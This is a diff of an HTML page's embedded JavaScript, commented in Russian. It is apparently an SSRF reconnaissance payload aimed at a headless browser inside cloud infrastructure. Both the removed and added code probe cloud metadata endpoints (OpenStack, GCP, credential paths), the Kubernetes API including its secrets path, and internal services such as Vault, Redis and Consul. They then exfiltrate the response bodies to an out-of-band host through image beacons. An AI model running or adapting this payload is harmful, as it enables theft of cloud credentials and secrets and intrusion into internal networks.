@@ -8,108 +8,112 @@ function fire(path) {
   new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
 
-fire('/alive7?t=0');
+fire('/alive8?t=0');
 
-// 1. Узнаём внешний IP пода через ipify, затем сканируем его порты
-// Chrome PNA блокирует только localhost/link-local — публичные IP не блокируются
-fetch('https://api.ipify.org/', {signal: AbortSignal.timeout(3000)})
-  .then(function(r) { return r.text(); })
-  .then(function(ip) {
-    ip = ip.trim();
-    fire('/myip?ip=' + encodeURIComponent(ip));
-
-    var extTargets = [
-      [9222,  'http://' + ip + ':9222/json'],
-      [9222,  'http://' + ip + ':9222/json/version'],
-      [15000, 'http://' + ip + ':15000/'],
-      [15000, 'http://' + ip + ':15000/config_dump'],
-      [15090, 'http://' + ip + ':15090/stats/prometheus'],
-      [8080,  'http://' + ip + ':8080/'],
-      [9090,  'http://' + ip + ':9090/api/v1/status/buildinfo'],
-    ];
-
-    extTargets.forEach(function(t) {
-      var port = t[0], url = t[1], t0 = Date.now();
-      fetch(url, {signal: AbortSignal.timeout(3000)})
-        .then(function(r) {
-          return r.text().then(function(body) {
-            fire('/ext-ok-' + port + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
-          });
-        })
-        .catch(function(e) {
-          var ms = Date.now() - t0;
-          if (ms < 2900) fire('/ext-err-' + port + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 60)));
-          else fire('/ext-to-' + port);
-        });
-    });
-  })
-  .catch(function(e) { fire('/myip-err?e=' + encodeURIComponent(e.message.slice(0, 60))); });
-
-// 2. k8s DNS discovery по именам сервисов
-var k8sDns = [
-  ['k8s-def',     'https://kubernetes.default/version'],
-  ['k8s-cluster', 'https://kubernetes.default.svc.cluster.local/version'],
-  ['k8s-http',    'http://kubernetes.default.svc.cluster.local:8080/version'],
+// 1. OpenStack metadata (VK Cloud / Cloud.ru / Selectel используют OpenStack)
+// Путь /openstack/latest/meta_data.json возвращает JSON с instance_id, hostname, etc.
+var osTargets = [
+  ['os-meta',    'http://169.254.169.254/openstack/latest/meta_data.json'],
+  ['os-user',    'http://169.254.169.254/openstack/latest/user_data'],
+  ['os-vendor',  'http://169.254.169.254/openstack/latest/vendor_data.json'],
+  ['os-net',     'http://169.254.169.254/openstack/latest/network_data.json'],
+  ['os-2020',    'http://169.254.169.254/openstack/2020-10-14/meta_data.json'],
 ];
-k8sDns.forEach(function(t) {
+osTargets.forEach(function(t) {
   var label = t[0], url = t[1], t0 = Date.now();
   fetch(url, {signal: AbortSignal.timeout(3000)})
     .then(function(r) {
       return r.text().then(function(body) {
-        fire('/dns-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
+        fire('/os-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
       });
     })
     .catch(function(e) {
-      fire('/dns-err-' + label + '?ms=' + (Date.now()-t0) + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
+      var ms = Date.now() - t0;
+      fire('/os-err-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 60)));
     });
 });
 
-// 3. WebRTC без STUN — хост-кандидаты от локальных интерфейсов
-(function() {
-  try {
-    var pc = new RTCPeerConnection({iceServers: [], iceCandidatePoolSize: 4});
-    pc.createDataChannel('x');
-    pc.createOffer().then(function(o) { pc.setLocalDescription(o); });
-    var n = 0;
-    pc.onicecandidate = function(ev) {
-      if (!ev || !ev.candidate) { fire('/rtc-done?n=' + n); return; }
-      n++;
-      fire('/rtc-cand?c=' + encodeURIComponent((ev.candidate.candidate || '').slice(0, 150)));
-    };
-    setTimeout(function() { fire('/rtc-timeout?n=' + n); }, 4000);
-  } catch(e) { fire('/rtc-err?e=' + encodeURIComponent(e.message.slice(0, 80))); }
-})();
-
-// 4. iframe к IMDS
-(function() {
-  var t0 = Date.now();
-  try {
-    var f = document.createElement('iframe');
-    f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
-    f.onload = function() {
+// 2. IMDS TCP-state test: timeout 500ms отличает "TCP connected" от "SYN filtered"
+// Если "signal timed out" при 500ms → TCP SYN-ACK получен (сервер жив!)
+// Если "Failed to fetch" при <100ms → connection refused / ICMP unreachable
+var imdsTargets = [
+  ['imds-root',   'http://169.254.169.254/'],
+  ['imds-latest', 'http://169.254.169.254/latest/'],
+  ['imds-os',     'http://169.254.169.254/openstack/'],
+  ['gke-creds',   'http://169.254.170.2/v2/credentials'],     // GKE workload identity
+  ['gke-env',     'http://169.254.170.2/v2/metadata/instance'],
+];
+imdsTargets.forEach(function(t) {
+  var label = t[0], url = t[1], t0 = Date.now();
+  fetch(url, {signal: AbortSignal.timeout(500)})
+    .then(function(r) {
+      return r.text().then(function(body) {
+        fire('/imds-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
+      });
+    })
+    .catch(function(e) {
       var ms = Date.now() - t0;
-      fire('/iframe-load?ms=' + ms);
-      try {
-        var txt = f.contentDocument.body.innerText.slice(0, 300);
-        fire('/iframe-body?ms=' + ms + '&d=' + encodeURIComponent(txt));
-      } catch(e2) { fire('/iframe-cors?ms=' + ms); }
-    };
-    f.onerror = function() { fire('/iframe-err?ms=' + (Date.now()-t0)); };
-    f.src = 'http://169.254.169.254/latest/meta-data/';
-    document.body.appendChild(f);
-    setTimeout(function() { fire('/iframe-pending?ms=' + (Date.now()-t0)); }, 5000);
-  } catch(e) { fire('/iframe-ex?e=' + encodeURIComponent(e.message.slice(0, 60))); }
-})();
+      fire('/imds-' + (ms >= 490 ? 'to' : 'err') + '-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 50)));
+    });
+});
 
-// 5. Данные среды
-(function() {
-  var info = {
-    ua: navigator.userAgent.slice(0, 100),
-    hw: navigator.hardwareConcurrency || 0,
-    mem: navigator.deviceMemory || 0,
-  };
-  fire('/env?d=' + encodeURIComponent(JSON.stringify(info).slice(0, 200)));
-})();
+// 3. GCP metadata с обязательным заголовком (если VK на GCP)
+// Требует Metadata-Flavor: Google — без него возвращает 403
+fetch('http://169.254.169.254/computeMetadata/v1/instance/id', {
+  headers: {'Metadata-Flavor': 'Google'},
+  signal: AbortSignal.timeout(3000),
+}).then(function(r) {
+  return r.text().then(function(body) {
+    fire('/gcp-ok?ms=' + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 200)));
+  });
+}).catch(function(e) {
+  fire('/gcp-err?ms=' + '&e=' + encodeURIComponent(e.message.slice(0, 60)));
+});
+
+// 4. k8s API по HTTP без TLS (порт 8080, insecure, отключён в современных k8s но не везде)
+var k8sHttp = [
+  ['k8s-8080',  'http://10.96.0.1:8080/version'],
+  ['k8s-8080a', 'http://10.96.0.1:8080/api/v1/namespaces/default/secrets'],
+  ['k8s-6443',  'http://10.96.0.1:6443/version'],  // HTTPS порт через HTTP
+];
+k8sHttp.forEach(function(t) {
+  var label = t[0], url = t[1], t0 = Date.now();
+  fetch(url, {signal: AbortSignal.timeout(2000)})
+    .then(function(r) {
+      return r.text().then(function(body) {
+        fire('/k8s-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 500)));
+      });
+    })
+    .catch(function(e) {
+      var ms = Date.now() - t0;
+      fire('/k8s-' + (ms >= 1950 ? 'to' : 'err') + '-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 50)));
+    });
+});
+
+// 5. Внутренние сервисы через DNS - проверяем наличие по тайминбу
+// ms < 30 = NXDOMAIN; ms 30-200 = TCP rejected; ms >= 1900 = TCP connected (сервис жив!)
+var intDns = [
+  ['grafana',    'http://grafana/'],
+  ['prometheus', 'http://prometheus:9090/api/v1/status/buildinfo'],
+  ['clickhouse', 'http://clickhouse:8123/'],
+  ['redis',      'http://redis:6379/'],
+  ['elastic',    'http://elasticsearch:9200/'],
+  ['vault',      'http://vault:8200/v1/sys/health'],
+  ['consul',     'http://consul:8500/v1/agent/self'],
+];
+intDns.forEach(function(t) {
+  var label = t[0], url = t[1], t0 = Date.now();
+  fetch(url, {signal: AbortSignal.timeout(2000)})
+    .then(function(r) {
+      return r.text().then(function(body) {
+        fire('/svc-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status + '&d=' + encodeURIComponent(body.slice(0, 300)));
+      });
+    })
+    .catch(function(e) {
+      var ms = Date.now() - t0;
+      fire('/svc-' + (ms < 30 ? 'nx' : ms >= 1900 ? 'to' : 'err') + '-' + label + '?ms=' + ms);
+    });
+});
 </script>
 </body>
 </html>
